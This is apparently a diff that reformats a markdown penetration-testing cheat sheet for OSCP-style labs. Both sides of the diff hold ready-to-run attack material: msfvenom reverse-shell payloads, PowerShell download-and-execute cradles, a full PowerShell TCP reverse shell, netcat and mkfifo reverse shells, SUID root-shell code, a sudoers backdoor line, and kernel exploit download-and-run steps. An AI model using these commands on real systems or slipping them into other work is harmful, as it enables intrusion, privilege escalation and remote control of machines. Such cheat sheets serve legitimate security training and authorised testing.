@@ -1367,60 +1367,60 @@ An uploadable batch file for performing basic windows enumeration.
   - Web Backdoors from Fuzzdb
       <https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors>
 
-- Creating Meterpreter Shells with MSFVenom - <http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/>
-  *Linux*
-  `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
-  *Windows*
-  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
-  *Mac*
-  `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
+- Creating Meterpreter Shells with [MSFVenom](http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/)
+  - *Linux*
+    - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf`
+  - *Windows*
+    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe`
+  - *Mac*
+    - `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho`
 
   **Web Payloads**
 
-  *PHP*
-  `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
-  OR
-  `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
-  Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage:
-  `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
-  *ASP*
-  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
-  *JSP*
-  `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
-  *WAR*
-  `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
+    - *PHP*
+      - `msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
+      OR
+      - `msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php`
+    - Then we need to add the *<?php* at the first line of the file so that it will execute as a PHP webpage:
+      - `cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php`
+    - *ASP*
+      - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp`
+    - *JSP*
+      - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp`
+    - *WAR*
+      - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war`
 
   **Scripting Payloads**
 
-  *Python*
+    - *Python*
   `msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py`
-  *Bash*
-  `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
-  *Perl*
-  `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
+    - *Bash*
+      - `msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh`
+    - *Perl*
+      - `msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl`
 
   **Shellcode**
 
   For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
 
-  *Linux Based Shellcode*
-  `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
-  *Windows Based Shellcode*
-  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
-  *Mac Based Shellcode*
-  `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
+    - *Linux Based Shellcode*
+      - `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
+    - *Windows Based Shellcode*
+      - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
+    - *Mac Based Shellcode*
+      - `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
 
   **Handlers**
   Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
 
-  ```
-  use exploit/multi/handler
-  set PAYLOAD <Payload name>
-  set LHOST <LHOST value>
-  set LPORT <LPORT value>
-  set ExitOnSession false
-  exploit -j -z
-  ```
+    ```
+    use exploit/multi/handler
+    set PAYLOAD <Payload name>
+    set LHOST <LHOST value>
+    set LPORT <LPORT value>
+    set ExitOnSession false
+    exploit -j -z
+    ```
 
   - Once the required values are completed the following command will execute your handler – `msfconsole -L -r `
 
@@ -1439,9 +1439,9 @@ An uploadable batch file for performing basic windows enumeration.
 - Shellshock
 
   - Testing for shell shock with NMap
-    `root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip`
+    - `root@kali:~/Documents# nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi $ip`
   - git clone <https://github.com/nccgroup/shocker>
-    `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`
+    - `./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose`
   - Shell Shock SSH Forced Command; Check for forced command by enabling all debug output with ssh  
 
     ```shell
@@ -1456,17 +1456,14 @@ An uploadable batch file for performing basic windows enumeration.
 
 ### Execute a remote shell dropper
 
-Often, you can leverage PowerShell to execute a remotely hosted powershell script which contains a shell dropper (generated by the platform of your choosing).
-  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden -NonInteractive -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
-
-There are also some no-so-well documented PowerShell argument shortcuts so can use things like -w rather than -WindowsStyle (handy for smaller payloads):
-  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
+- Often, you can leverage PowerShell to execute a remotely hosted powershell script which contains a shell dropper (generated by the platform of your choosing).
+  - `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden -NonInteractive -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
+- There are also some no-so-well documented PowerShell argument shortcuts so can use things like -w rather than -WindowsStyle (handy for smaller payloads):
+  - `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"`
 
 ### Creating a fast TCP/UDP tunnel transported over HTTP secured via SSH with CHISEL
 
-Download the appropriate OS binaries from the release folder of the chisel [on here](https://github.com/jpillora/chisel): 
-`mv ~/Downloads/chisel_1.7.6_windows_amd64.gz .`
-
+- Download the appropriate OS binaries from the release folder of the chisel [on here](https://github.com/jpillora/chisel): `mv ~/Downloads/chisel_1.7.6_windows_amd64.gz .`
 - Unzip the files with gunzip:
   - `gunzip -d chisel_1.7.6_windows_amd64.gz` & then make it executable `mv chisel_1.7.6_windows_amd64 chisel.exe`
   - `gunzip -d chisel_1.7.6_linux_amd64.gz` & then make it executable by `mv chisel_1.7.6_linux_amd64 chisel` & `chmod +x chisel`
@@ -1478,46 +1475,46 @@ Download the appropriate OS binaries from the release folder of the chisel [on h
 ### Upgrading your Windows Shell
 
 You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:
+
 #### Netcat Reverseshell Oneliners for Windows
 
-Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell. If you have transfered the shell to victim box, execute:
-  `nc.exe 10.10.14.23 9001 -e powershell`
+- Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell. If you have transfered the shell to victim box, execute: `nc.exe 10.10.14.23 9001 -e powershell`
+
 #### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell
 
-You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
-
-`CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"`
+- You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
+  - `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"`
 
 #### Upgrade Shell with PowerShell Nishang
 
 Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security and post exploitation during Penetraion Tests. The scripts are written on the basis of requirement by the author during real Penetration Tests:
 **For this to work, you should have an exploit that can run remote command execution**
 
-      ```bash
-      root@kali:~/test# git clone https://github.com/samratashok/nishang.git                                                  
-      Cloning into 'nishang'...
-      remote: Enumerating objects: 1612, done.
-      remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612
-      Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done.
-      Resolving deltas: 100% (1010/1010), done.
-      root@kali:~/test# cd nishang/
-      root@kali:~/test/nishang# cd Shells/
-      root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 >> Invoke-PowerShellTcp.ps1
-      root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80
-      ```
+    ```bash
+    root@kali:~/test# git clone https://github.com/samratashok/nishang.git                                                  
+    Cloning into 'nishang'...
+    remote: Enumerating objects: 1612, done.
+    remote: Total 1612 (delta 0), reused 0 (delta 0), pack-reused 1612
+    Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done.
+    Resolving deltas: 100% (1010/1010), done.
+    root@kali:~/test# cd nishang/
+    root@kali:~/test/nishang# cd Shells/
+    root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 >> Invoke-PowerShellTcp.ps1
+    root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80
+    ```
 
   - You can install nishang via `sudo apt-get install nishang` which installs all of the reverseshells within `/user/share/nishang/shells/` to be used for purpose of reverse shells.
       `cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1`
-  - After copying the script to your local working folder, copy one of the suitable example lines in the rev.ps1 to the bottom of the file:
+  - After copying the script to your local working folder, copy one of the suitable example lines in the **rev.ps1** to the bottom of the file:
       `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 9001`
   - Start a web server via python
       `python3 -m http.server 80`
   - And within your RCE, put this as:
-      `powershell.exe -command IEX( IWR http://10.10.14.19:80/rev.ps1 -UseBasicParsing)`
+    - `powershell.exe -command IEX( IWR http://10.10.14.19:80/rev.ps1 -UseBasicParsing)`
       or
-      `powershell.exe -command IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.19:80/rev.ps1')`
+    - `powershell.exe -command IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.19:80/rev.ps1')`
   - You have to remember to run the handler to catch the shell:
-      `nc -nvlp 9001`
+    - `nc -nvlp 9001`
 
 ## File Transfers
 
@@ -1527,32 +1524,27 @@ Nishang is a framework and collection of scripts and payloads which enables usag
 - Simple Local Web Servers
 
   - Run a basic http server, great for serving up shells etc  
-        python -m SimpleHTTPServer 80
+    - `python -m SimpleHTTPServer 80`
 
-  - Run a basic Python3 http server, great for serving up shells
-        etc  
-        python3 -m http.server
+  - Run a basic Python3 http server, great for serving up shells etc  
+    - `python3 -m http.server 80`
 
   - Run a ruby webrick basic http server  
-        ruby -rwebrick -e "WEBrick::HTTPServer.new  
-        (:Port => 80, :DocumentRoot => Dir.pwd).start"
+    - `ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"`
 
   - Run a basic PHP http server  
-        php -S $ip:80
+    - `php -S $ip:80`
 
-- Creating a wget VB Script on Windows:  
-    [*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt)
+- Creating a wget VB Script on Windows: [*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt)
 
 - Mounting File Shares
-
   - Mount NFS share to /mnt/nfs  
-        mount $ip:/vol/share /mnt/nfs
+    - `mount $ip:/vol/share /mnt/nfs`
 
 - HTTP Put  
-    nmap -p80 $ip --script http-put --script-args
-    http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
+    - `nmap -p80 $ip --script http-put --script-args http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php`
 
-    Also check : <https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/>
+Also check : <https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/>
 
 ### Uploading Files
 
@@ -1566,10 +1558,8 @@ Sometimes we will want to upload a file to the Windows machine in order to speed
 _NOTE_ There are MANY more ways to move files back and forth between a Windows machine, most can be found on the LOLBAS project: <https://lolbas-project.github.io/>
 
 Most of these will require that we create a simple local webserver on our Kali box to serve the files (NOTE: I have had issues running this command within TMUX for whatever reason... so dont run it in TMUX). 
-I like to use the Python Simple HTTP Server:
-  `python -m SimpleHTTPServer 80` or `python3 -m http.server 80`
-
-Or the Python pyftpdlib FTP Server (again don't run from TMUX):
+- I like to use the Python Simple HTTP Server: `python -m SimpleHTTPServer 80` or `python3 -m http.server 80`
+- Or the Python pyftpdlib FTP Server (again don't run from TMUX):
 
   ```shell
   apt-get install python-pyftpdlib
@@ -1800,183 +1790,145 @@ Kali comes loade with the incredible Impacket library which is a swiss army knif
 ### Packing Files
 
 - Ultimate Packer for eXecutables  
-        upx -9 nc.exe
+  - `upx -9 nc.exe`
 
-- exe2bat - Converts EXE to a text file that can be copied and
-        pasted  
-        locate exe2bat  
-        wine exe2bat.exe nc.exe nc.txt
+- exe2bat - Converts EXE to a text file that can be copied and pasted  
+  - `locate exe2bat`  
+  - `wine exe2bat.exe nc.exe nc.txt`
 
-- Veil - Evasion Framework -
-        <https://github.com/Veil-Framework/Veil-Evasion>  
-        apt-get -y install git  
-        git clone <https://github.com/Veil-Framework/Veil-Evasion.git>  
-        cd Veil-Evasion/  
-        cd setup  
-        setup.sh -c
+- Veil - Evasion Framework - <https://github.com/Veil-Framework/Veil-Evasion>  
+    
+    ```shell
+    apt-get -y install git  
+    git clone <https://github.com/Veil-Framework/Veil-Evasion.git>  
+    cd Veil-Evasion/  
+    cd setup  
+    setup.sh -c
+    ```
 
 ## Linux Privilege Escalation
 
-**Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.**
+Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.**
 
 - Defacto Linux Privilege Escalation Guide  - A much more through guide for linux enumeration:
     [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 
 - Try the obvious - Maybe the user is root or can sudo to root:  
-
-    `id`
-
-    `sudo su`
+  - `id`
+  - `sudo su`
 
 - Here are the commands I have learned to use to perform linux enumeration and privledge escalation:
-
-    What users can login to this box (Do they use their username as their password)?:
-
+  - What users can login to this box (Do they use their username as their password)?:
     `grep -vE "nologin|false" /etc/passwd`  
+  - What kernel version are we using? Do we have any kernel exploits for this version?
+    - `uname -a`
+    - `searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"`
+  - What applications have active connections?:
+    - `netstat -tulpn`
+  - What services are running as root?:
+    - `ps aux | grep root`
+  - What files run as root / SUID / GUID?:
 
-    What kernel version are we using? Do we have any kernel exploits for this version?
-
-    `uname -a`
-
-    `searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"`
-
-    What applications have active connections?:
-
-    `netstat -tulpn`
-
-    What services are running as root?:
-
-    `ps aux | grep root`
-
-    What files run as root / SUID / GUID?:
-
-      ```shell
-            find / -perm +2000 -user root -type f -print
-            find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
-            find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
-            find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
-            find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
-            for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
-            find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
-      ```
+    ```shell
+    find / -perm +2000 -user root -type f -print
+    find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+    find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+    find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+    find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+    for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done  
+    find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
+    ```
 
     What folders are world writeable?:
 
-      ```shell
-      find / -writable -type d 2>/dev/null      # world-writeable folders
-      find / -perm -222 -type d 2>/dev/null     # world-writeable folders
-      find / -perm -o w -type d 2>/dev/null     # world-writeable folders
-      find / -perm -o x -type d 2>/dev/null     # world-executable folders
-      find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
-      ```
+    ```shell
+    find / -writable -type d 2>/dev/null      # world-writeable folders
+    find / -perm -222 -type d 2>/dev/null     # world-writeable folders
+    find / -perm -o w -type d 2>/dev/null     # world-writeable folders
+    find / -perm -o x -type d 2>/dev/null     # world-executable folders
+    find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
+    ```
 
 - There are a few scripts that can automate the linux enumeration process:
-
   - Google is my favorite Linux Kernel exploitation search tool.  Many of these automated checkers are missing important kernel exploits which can create a very frustrating blindspot during your OSCP course.
-
-  - LinuxPrivChecker.py - My favorite automated linux priv enumeration checker -
-
-         [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py)
-
-  - LinEnum - (Recently Updated)
-
-      [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
-
-  - linux-exploit-suggester (Recently Updated)
-
-      [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-
+  - LinuxPrivChecker.py - My favorite automated linux priv enumeration checker - [https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py)
+  - LinEnum - (Recently Updated) [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
+  - linux-exploit-suggester (Recently Updated) [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
   - Highon.coffee Linux Local Enum - Great enumeration script!
+    - `wget https://highon.coffee/downloads/linux-local-enum.sh`
+  - Linux Privilege Exploit Suggester  (Old has not been updated in years) [https://github.com/PenturaLabs/Linux_Exploit_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
+  - Linux post exploitation enumeration and exploit checking tools [https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)
+- Handy Kernel Exploits
+  - CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) [https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)
 
-          `wget https://highon.coffee/downloads/linux-local-enum.sh`
+    ```shell
+    wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
+    $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
+    $ ./i-can-haz-modharden
+    [+] launching root shell!
+    # id
+    uid=0(root) gid=0(root)
+    ```
+  - CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8 [https://www.exploit-db.com/exploits/15285/](https://www.exploit-db.com/exploits/15285/)
+  - CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) [https://git.zx2c4.com/CVE-2012-0056/about/](https://git.zx2c4.com/CVE-2012-0056/about/)  
+  - Linux CVE 2012-0056  
 
-  - Linux Privilege Exploit Suggester  (Old has not been updated in years)
-
-    [https://github.com/PenturaLabs/Linux_Exploit_Suggester](https://github.com/PenturaLabs/Linux_Exploit_Suggester)
-
-  - Linux post exploitation enumeration and exploit checking tools  
-
-    [https://github.com/reider-roque/linpostexp](https://github.com/reider-roque/linpostexp)
-
-Handy Kernel Exploits
-
-- CVE-2010-2959 - 'CAN BCM' Privilege Escalation - Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32)
-
-    [https://www.exploit-db.com/exploits/14814/](https://www.exploit-db.com/exploits/14814/)
-
-         wget -O i-can-haz-modharden.c http://www.exploit-db.com/download/14814
-         $ gcc i-can-haz-modharden.c -o i-can-haz-modharden
-         $ ./i-can-haz-modharden
-         [+] launching root shell!
-         # id
-         uid=0(root) gid=0(root)
-
-- CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8  
-    [https://www.exploit-db.com/exploits/15285/](https://www.exploit-db.com/exploits/15285/)
-
-- CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)  
-    [https://git.zx2c4.com/CVE-2012-0056/about/](https://git.zx2c4.com/CVE-2012-0056/about/)  
-    Linux CVE 2012-0056  
-
-          wget -O exploit.c http://www.exploit-db.com/download/18411 
-          gcc -o mempodipper exploit.c  
-          ./mempodipper
-
-- CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  
-    [https://dirtycow.ninja/](https://dirtycow.ninja/)  
-    First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016  
-
+    ```shell
+    wget -O exploit.c http://www.exploit-db.com/download/18411 
+    gcc -o mempodipper exploit.c  
+    ./mempodipper
+    ```
+- CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8  [https://dirtycow.ninja/](https://dirtycow.ninja/) First existed on 2.6.22 (released in 2007) and was fixed on Oct 18, 2016  
 - Run a command as a user other than root  
-
-          sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf
-
+    - sudo -u haxzor /usr/bin/vim /etc/apache2/sites-available/000-default.conf
 - Add a user or change a password
-
-          /usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor  
-          echo thePassword | passwd haxzor --stdin
-
+    ```shell
+    /usr/sbin/useradd -p 'openssl passwd -1 thePassword' haxzor  
+    echo thePassword | passwd haxzor --stdin
+    ```
 - Local Privilege Escalation Exploit in Linux
 
   - **SUID** (Set owner User ID up on execution)  
-        Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required. below are some quick copy and paste examples for various shells:
+    Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required. below are some quick copy and paste examples for various shells:
 
-            ```shell
-            # SUID C Shell for /bin/bash  
+      ```shell
+      # SUID C Shell for /bin/bash  
 
-            int main(void){  
-            setresuid(0, 0, 0);  
-            system("/bin/bash");  
-            }  
+      int main(void){  
+      setresuid(0, 0, 0);  
+      system("/bin/bash");  
+      }  
 
-            # SUID C Shell for /bin/sh  
+      # SUID C Shell for /bin/sh  
 
-            int main(void){  
-            setresuid(0, 0, 0);  
-            system("/bin/sh");  
-            }  
+      int main(void){  
+      setresuid(0, 0, 0);  
+      system("/bin/sh");  
+      }  
 
-            # Building the SUID Shell binary  
-            gcc -o suid suid.c  
-            # For 32 bit:  
-            gcc -m32 -o suid suid.c
-            ```
+      # Building the SUID Shell binary  
+      gcc -o suid suid.c  
+      # For 32 bit:  
+      gcc -m32 -o suid suid.c
+      ```
 
   - Create and compile an SUID from a limited shell (no file transfer)  
 
-              echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
-              gcc privsc.c -o privsc
+    ```
+    echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c  
+    gcc privsc.c -o privsc
+    ```
 
 - Handy command if you can get a root user to run it. Add the www-data user to Root SUDO group with no password requirement:
+  - `echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`
 
-    `echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`
+- You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable to execute your command instead.  In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on port 4444.
 
-- You may find a command is being executed by the root user, you may be able to modify the system PATH environment variable
-    to execute your command instead.  In the example below, ssh is replaced with a reverse shell SUID connecting to 10.10.10.1 on
-    port 4444.
-
-      set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
-      echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
-      chmod +x ssh
+    ```shell
+    set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
+    chmod +x ssh
+    ```
 
 - Kernel Exploit Suggestions for Kernel Version 3.0.0  
      `./usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 3.0.0`
@@ -2191,13 +2143,13 @@ Prior to successfully performing a Windows run as, we of course need a valid win
 
 **Powershell** can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.
 
-```powershell
- $username = '<username here>'
- $password = '<password here>'
- $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
- $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
- Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
-```
+  ```powershell
+  $username = '<username here>'
+  $password = '<password here>'
+  $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+  $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+  Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
+  ```
 
 - Next run this script using powershell.exe:
   `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`
